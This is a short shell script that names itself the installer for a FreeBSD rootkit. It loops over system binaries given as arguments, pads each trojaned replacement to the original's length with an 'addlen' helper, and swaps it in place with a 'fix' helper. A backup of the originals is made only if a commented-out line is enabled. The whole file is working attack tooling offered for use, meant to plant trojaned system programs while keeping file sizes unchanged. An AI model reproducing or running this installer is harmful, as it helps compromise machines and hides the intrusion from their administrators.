#!/bin/sh
# Installation script for the FreeBSD rootkit. Make as many changes as you like.

# Uncomment the below line if you want to backup the files.
#BAKDIR=bak

for BIN; do
	PROG=`basename $BIN`
	echo -n "Installing $PROG. . ."
	RKBIN=$PROG/$PROG
	if [ -x $BIN ]; then
		addlen $RKBIN $BIN
		fix $BIN $RKBIN $BAKDIR
	fi
	echo "done."
done

echo "The installation is complete."
